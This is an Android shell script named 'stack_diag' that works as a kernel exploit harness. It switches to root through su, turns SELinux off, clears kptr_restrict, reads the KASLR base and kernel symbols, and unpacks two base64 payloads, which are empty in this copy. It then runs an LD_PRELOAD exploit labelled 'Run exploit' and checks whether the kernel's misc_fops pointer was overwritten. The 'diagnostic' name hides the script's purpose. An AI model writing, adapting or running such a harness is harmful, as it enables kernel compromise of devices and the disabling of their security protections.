#!/system/bin/sh
D=/data/local/tmp/stack_diag
case "$D" in
    /data/local/tmp/*) ;;
    *) echo "FAIL: unsafe work dir: '$D'" >&2; exit 1 ;;
esac
mkdir -p "$D" || { echo "FAIL: cannot create $D (run as root)" >&2; exit 1; }
[ -d "$D" ] && [ -w "$D" ] || { echo "FAIL: work dir is not writable: $D" >&2; exit 1; }
OUT="$D/diag.txt"
log() { echo "$@"; echo "$@" >> "$OUT"; }
log "=== stack_diag $(date) ==="
UID_NOW=$(id -u 2>/dev/null || echo unknown)
SELINUX_CONTEXT=$(cat /proc/self/attr/current 2>/dev/null | tr -d '\000')
[ -n "$SELINUX_CONTEXT" ] || SELINUX_CONTEXT=unknown
log "uid: $UID_NOW"
log "selinux: $SELINUX_CONTEXT"
if [ "$UID_NOW" != "0" ]; then
    SCRIPT_PATH="$0"
    case "$SCRIPT_PATH" in
        /*) ;;
        *) SCRIPT_PATH="$(pwd)/$SCRIPT_PATH" ;;
    esac
    for SU_PATH in "$(command -v su 2>/dev/null)" \
        /data/adb/magisk/su /data/adb/ksu/bin/su \
        /data/adb/ap/bin/su /system/bin/su /system/xbin/su /sbin/su; do
        [ -x "$SU_PATH" ] || continue
        if "$SU_PATH" -c id 2>/dev/null | grep -q 'uid=0'; then
            log "re-exec via: $SU_PATH"
            exec "$SU_PATH" -c "sh \"$SCRIPT_PATH\""
        fi
    done
    log "no usable su found; continuing with current uid"
fi
setenforce 0 2>/dev/null
if [ -w /proc/sys/kernel/kptr_restrict ]; then
    echo 0 > /proc/sys/kernel/kptr_restrict
else
    log "NOTE: /proc/sys/kernel/kptr_restrict is not writable"
fi
echo "解压工具..."
base64 -d > "$D/kcore_read" << 'KREAD_EOF'

KREAD_EOF
chmod 755 "$D/kcore_read"
base64 -d > "$D/preload.so" << 'PRELOAD_EOF'

PRELOAD_EOF
chmod 755 "$D/preload.so"

KREAD="$D/kcore_read"
PRELOAD="$D/preload.so"

log "=== KASLR base ==="
TEXT_ADDR=$(grep ' T _text$' /proc/kallsyms 2>/dev/null | awk '{print $1}')
log "_text: 0x$TEXT_ADDR"
[ -z "$TEXT_ADDR" ] && log "FAIL: /proc/kallsyms unavailable (need a privileged device shell)" && exit 1
KASLR_BASE="0x$TEXT_ADDR"

log "=== Verify kcore_read ==="
INIT_TASK="0x$(grep ' D init_task$' /proc/kallsyms 2>/dev/null | awk '{print $1}')"
[ "$INIT_TASK" = "0x" ] && { log "FAIL: init_task symbol unavailable"; exit 1; }
if [ ! -e /proc/kcore ]; then
    log "FAIL: /proc/kcore does not exist"
    exit 1
fi
if [ ! -r /proc/kcore ]; then
    log "FAIL: /proc/kcore is not readable"
    exit 1
fi
KREAD_ERR="$D/kcore_read_init.err"
"$KREAD" "$INIT_TASK" 8 "$D/init.bin" 2>"$KREAD_ERR"
KREAD_STATUS=$?
if [ "$KREAD_STATUS" -eq 0 ] && [ -s "$D/init.bin" ] && [ "$(wc -c < "$D/init.bin")" -eq 8 ]; then
    log "kcore_read OK"
else
    KREAD_MSG=$(tr '\n' ' ' < "$KREAD_ERR" 2>/dev/null)
    log "FAIL: kcore_read (status=$KREAD_STATUS)"
    [ -n "$KREAD_MSG" ] && log "kcore_read error: $KREAD_MSG"
    exit 1
fi

log "=== ashmem_misc.fops ==="
FOPS_ADDR="0x$(grep ' [dt] misc_fops$' /proc/kallsyms 2>/dev/null | awk '{print $1}')"
[ "$FOPS_ADDR" = "0x" ] && { log "FAIL: misc_fops symbol unavailable"; exit 1; }
log "fops: $FOPS_ADDR"

$KREAD "$FOPS_ADDR" 8 "$D/fops_before.bin" 2>/dev/null
FOPS_BEFORE=$(od -A n -t x1 "$D/fops_before.bin" | tr -d ' \n')
log "before: $FOPS_BEFORE"

BOOT_BEFORE=$(cat /proc/sys/kernel/random/boot_id)
log "boot_id: $BOOT_BEFORE"

log "=== Run exploit ==="
CFI_KASLR_BASE="$KASLR_BASE" LD_PRELOAD="$PRELOAD" /system/bin/id > "$D/exploit.txt" 2>&1 &
EXPID=$!
sleep 8

$KREAD "$FOPS_ADDR" 8 "$D/fops_during.bin" 2>/dev/null
FOPS_DURING=$(od -A n -t x1 "$D/fops_during.bin" | tr -d ' \n')
log "during: $FOPS_DURING"

wait $EXPID 2>/dev/null

$KREAD "$FOPS_ADDR" 8 "$D/fops_after.bin" 2>/dev/null
FOPS_AFTER=$(od -A n -t x1 "$D/fops_after.bin" | tr -d ' \n')
log "after:  $FOPS_AFTER"

log ""
if [ "$FOPS_BEFORE" != "$FOPS_DURING" ]; then
    log ">>> WRITE during pselect! rb_insert works!"
elif [ "$FOPS_BEFORE" != "$FOPS_AFTER" ]; then
    log ">>> WRITE after exploit!"
else
    log ">>> UNCHANGED — write did NOT happen"
fi

if [ -f /sdcard/Download/crash.txt ]; then
    log ""
    log "=== crash.txt (last 20) ==="
    tail -20 /sdcard/Download/crash.txt >> "$OUT"
fi

BOOT_AFTER=$(cat /proc/sys/kernel/random/boot_id)
log ""
log "boot_id before: $BOOT_BEFORE"
log "boot_id after:  $BOOT_AFTER"
[ "$BOOT_BEFORE" != "$BOOT_AFTER" ] && log ">>> REBOOT detected!"

setenforce 1 2>/dev/null
log "=== DONE ==="
